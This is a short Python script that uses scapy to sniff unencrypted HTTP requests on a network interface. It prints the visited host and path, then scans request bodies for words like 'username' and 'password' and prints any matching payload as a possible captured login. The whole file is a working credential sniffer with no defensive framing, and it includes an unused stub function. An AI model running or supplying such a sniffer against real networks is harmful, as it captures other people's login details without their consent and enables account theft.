#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url():
    pass


def get_login(packet):
    load = packet[scapy.Raw].load
    keywords = ['username', 'user', 'login', 'password', 'pass']
    for key in keywords:
        if key in load:
            return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        host_path = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(host_path)
        if packet.haslayer(scapy.Raw):
            poss_login = get_login(packet)
            if poss_login:
                print('\n\n**possible user/password  > ' + poss_login + ' **\n\n')

sniff('eth0')